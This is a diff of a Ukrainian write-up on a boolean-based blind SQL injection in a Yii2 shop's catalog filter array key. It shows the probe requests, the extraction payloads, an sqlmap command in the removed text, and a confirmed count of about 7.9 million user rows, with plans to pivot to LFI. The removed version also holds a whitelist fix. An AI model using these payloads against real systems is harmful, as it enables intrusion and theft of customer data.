@@ -1,58 +1,52 @@
-# 02 — SQL Injection (Boolean-Based Blind)
+#  SQL Injection
 
-## Де знайшли
-`/shop/catalog/novetly?filter[8][490]=1`
+## Як знайшли
 
-## Виявлення
+URL фільтру каталогу виглядав так:
 
-GET /shop/catalog/novetly?filter[8][490]=1 → 200 OK
-GET /shop/catalog/novetly?filter[8][490']=1 → 500 Database Exception
-GET /shop/catalog/novetly?filter[8][490 AND 1=1]=1 → 200
-GET /shop/catalog/novetly?filter[8][490 AND 1=2]=1 → 500
+/shop/catalog/novetly?filter[8][490]=1
 
 
-## Чому вразливо
+Спробували поставити апостроф у ключ масиву `490'`:
 
-Yii2 параметризує **значення**, але **ключ масиву** конкатенується напряму:
+filter[8][490']=1 → 500 Database Exception (#42000)
 
-```php
-// Приблизна вразлива логіка
-$key = key($_GET['filter'][8]);           // "490 AND 1=1" — не санується
-$sql = "WHERE filter_id = " . $key;      // конкатенація в SQL
-$db->query($sql, [$value]);              // значення захищене, ключ — ні
-```
 
-## Boolean Blind — витяг даних посимвольно
+Сервер "впав" — значить, текст потрапляє напряму в SQL-запит.
 
-```sql
--- Версія БД
-filter[8][490 AND SUBSTRING((SELECT version()),1,1)='8']=1  → 200 ✓
+---
 
--- Кількість юзерів
-filter[8][490 AND (SELECT COUNT(*) FROM users) > 1000000]=1 → 200 ✓
+## Чому так вийшло
 
--- Автоматизація
-sqlmap -u "https://target.com/shop/catalog/novetly?filter[8][490]=1" \
-  --level=5 --risk=3 --technique=B --dbms=mysql -p "filter[8]"
-```
+Фреймворк Yii2 захищає **значення** параметрів через підстановку `?`.
+Але **ключ масиву** ніхто не захищав — він йшов рядком у SQL:
+
+WHERE filter_id = [490 AND 1=1]
+↑
+це вже SQL, не дані
+
+
+---
+
+## Як витягували дані — Boolean Blind
+
+Відповідь не показує дані напряму. Але є два стани: `200 OK` або `500 Error`.
+Це і є оракул — можна задавати питання типу "так/ні":
+
+filter[8][490 AND (SELECT COUNT(*) FROM users) > 1000000]=1
+→ 200 ✓ (більше мільйона — правда)
+
+filter[8][490 AND SUBSTRING((SELECT version()),1,1)='8']=1
+→ 200 ✓ (перший символ версії — це '8')
+
+
+Так посимвольно витягують будь-які дані з бази.
+
+**Проблема**: це дуже повільно. Для 7.9 млн рядків — потрібно було б 99 років.
+Тому шукали інший спосіб дістати дані швидше (→ LFI, пряме підключення до БД).
+
+---
 
 ## Результат
 
-| | |
-|---|---|
-| СУБД | Percona MySQL 8.4.3 |
-| БД | `ishop` |
-| Рядків у `users` | ~7 876 914 |
-
-> Повна виємка boolean blind = 99 років → потрібен інший канал.
-
-## Захист
-
-```php
-// ✅ Whitelist для ключів фільтру
-$allowedKeys = [490, 491, 492];
-$key = (int) key($_GET['filter'][8]);
-if (!in_array($key, $allowedKeys, true)) {
-    throw new InvalidArgumentException();
-}
-```
+Підтвердили: 7 876 914 клієнтів у таблиці `users`. БД — Percona MySQL 8.4.3.
